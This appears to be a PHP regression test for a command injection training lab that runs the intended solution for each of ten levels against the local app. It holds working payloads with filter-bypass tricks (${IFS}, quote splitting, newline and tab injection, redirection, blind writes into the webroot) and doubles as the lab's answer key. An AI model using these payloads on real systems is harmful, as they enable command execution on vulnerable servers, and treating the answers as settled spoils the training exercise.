<?php
/**
 * OS Command Injection Lab self-test: runs the intended solution for every
 * level against the live app, so a level that has quietly stopped being
 * solvable is caught. Run inside the container:
 *
 *   docker compose exec web php /var/www/html/solve_check.php
 *
 * Not part of the challenge - it exists so the lab can be regression-tested.
 */
require_once __DIR__ . '/helpers.php';

$base = 'http://localhost';
$pass = 0;
$fail = 0;

/** GET with an already-encoded query string (no leading '?'). */
function get(string $path, string $query = ''): string
{
    $ctx = stream_context_create(['http' => [
        'method'  => 'GET',
        'timeout' => 40,
        'ignore_errors' => true,
    ]]);
    return (string)@file_get_contents($path . ($query === '' ? '' : '?' . $query), false, $ctx);
}

function q(string $name, string $value): string
{
    return $name . '=' . rawurlencode($value);
}

/**
 * The flag levels 3 and 4 hand out is built at request time by the lab's own
 * flag_system.php (it embeds the web user's uid, and the kernel name), so the
 * ground truth is the file that get_level_flag() wrote for this request.
 * get_flag_for_level() is the fallback for the static levels.
 */
function expected_flag(int $level): string
{
    $f = @file_get_contents("/tmp/level{$level}_flag.txt");
    if ($f !== false && trim($f) !== '') {
        return trim($f);
    }
    return get_flag_for_level($level);
}

/**
 * $exploit must contain the flag; $control (a benign request to the same page,
 * or '' when there is nothing to compare against) must not. Without the
 * control a level that simply printed its own flag would pass.
 */
function check(int $level, string $exploit, string $control, string $note): void
{
    global $pass, $fail;
    $want = expected_flag($level);
    $got  = $want !== '' && strpos($exploit, $want) !== false;
    $leak = $control !== '' && $want !== '' && strpos($control, $want) !== false;

    if ($got && !$leak) {
        $pass++;
        printf("  PASS  level %-2d %s  (%s)\n", $level, $want, $note);
    } else {
        $fail++;
        printf("  FAIL  level %-2d expected %s  (%s)%s\n", $level, $want, $note,
            $leak ? ' - the benign request already contained it' : ' - not in the response');
    }
}

/** Blind levels: wipe the drop file, run the injection, then fetch it. */
function exfil(int $level, string $page, string $query, string $drop): string
{
    global $base;
    @unlink("/var/www/html/$drop");
    get("$base/$page", $query);
    return get("$base/$drop");
}

echo "OS Command Injection Lab self-test\n----------------------------------\n";

/* 1 - no filter at all; any separator works */
$c = get("$base/level1.php", q('ip', '127.0.0.1'));
check(1, get("$base/level1.php", q('ip', '8.8.8.8; cat /tmp/level1_flag.txt')), $c,
    'plain ; chaining');

/* 2 - only ';' is blocked. systemctl does not exist here, so the first
       command always fails: || fires, && never would. */
$c = get("$base/level2.php", q('service', 'apache2'));
check(2, get("$base/level2.php", q('service', 'fakesvc || cat /tmp/level2_flag.txt')), $c,
    '|| after a command that always fails');

/* 3 - the space is blocked; ${IFS} is a word break the filter never sees */
$c = get("$base/level3.php", q('filename', '/etc/passwd'));
check(3, get("$base/level3.php", q('filename', '/etc/passwd;cat${IFS}/tmp/level3_flag.txt')), $c,
    '${IFS} instead of a space');

/* 4 - stripos() blocks 'cat' AND 'flag', and 'flag' is in the file name, so
       both the command and the path have to be disguised */
$c = get("$base/level4.php", q('process', 'apache'));
check(4, get("$base/level4.php", q('process', "apache;c''at\${IFS}/tmp/level4_f''lag.txt")), $c,
    "quote splitting on the command and on the path");

/* 5 - blind: no output at all, so write the flag somewhere servable */
check(5, exfil(5, 'level5.php',
        q('email', 'probe@x.test; cp /tmp/level5_flag.txt /var/www/html/_solvecheck_l5.txt'),
        '_solvecheck_l5.txt'), '',
    'side effect into the webroot');

/* 6 - the page reports only elapsed time; same exfil route */
check(6, exfil(6, 'level6.php',
        q('service', 'x; cp /tmp/level6_flag.txt /var/www/html/_solvecheck_l6.txt'),
        '_solvecheck_l6.txt'), '',
    'blind write, timing is the oracle');

/* 7 - ; & | ` $ ( ) < > space cat ls whoami id are all blocked. A newline is
       not, a tab is not, and '#' ends the line - but only at a word start, so
       the tab before it is load bearing. */
$c = get("$base/level7.php", 'logfile=syslog');
check(7, get("$base/level7.php", 'logfile=syslog%0Anl%09%2Ftmp%2Flevel7_flag.txt%09%23'), $c,
    'newline injection, tab for space, tab-then-# to drop the suffix');

/* 8 - the WAF removes every whitespace byte and every expansion, but not ';'.
       '<' hands over the file with no word break, and the trailing ';' stops
       the template's own " localhost" becoming an argument. */
$c = get("$base/level8.php", q('ports', '80'));
check(8, get("$base/level8.php", q('ports', '80;nl</tmp/level8_flag.txt;')), $c,
    '; separator, < redirection, trailing ; to orphan the tail');

/* 9 - fully blind and no timing readout either */
check(9, exfil(9, 'level9.php',
        q('pattern', ':80;cp /tmp/level9_flag.txt /var/www/html/_solvecheck_l9.txt'),
        '_solvecheck_l9.txt'), '',
    'out of band / side effect');

/* 10 - no filter; the rate limiter is per PHPSESSID and we send no cookie */
$c = get("$base/level10.php", q('process', 'apache'));
check(10, get("$base/level10.php", q('process', 'x; cat /tmp/level10_flag.txt')), $c,
    'session rate limit does not apply without a cookie');

/* Behaviour the levels teach but do not award a flag for - reported, not scored. */
$t0   = microtime(true);
$body = get("$base/level6.php", q('service', 'x; sleep 3'));
$took = microtime(true) - $t0;
$shown = preg_match('~Execution time:</strong>\s*([0-9.]+)~', $body, $m) ? (float)$m[1] : 0.0;
echo $shown >= 2.5 && $took >= 2.5
    ? sprintf("  note  level 6 timing oracle reads %.2fs for an injected 3s sleep\n", $shown)
    : sprintf("  WARN  level 6 timing oracle did not move (reported %.2fs, wall %.2fs)\n", $shown, $took);

$blocked = get("$base/level8.php", q('ports', '80;nl</tmp/level8_flag.txt')); // no trailing ;
echo strpos($blocked, expected_flag(8)) === false
    ? "  note  level 8 without the trailing ';' the tail becomes an argument and the read fails, as taught\n"
    : "  WARN  level 8 trailing ';' turned out not to matter\n";

foreach (['_solvecheck_l5.txt', '_solvecheck_l6.txt', '_solvecheck_l9.txt'] as $f) {
    @unlink("/var/www/html/$f");
}

echo "----------------------------------\n$pass passed, $fail failed\n";
exit($fail === 0 ? 0 : 1);
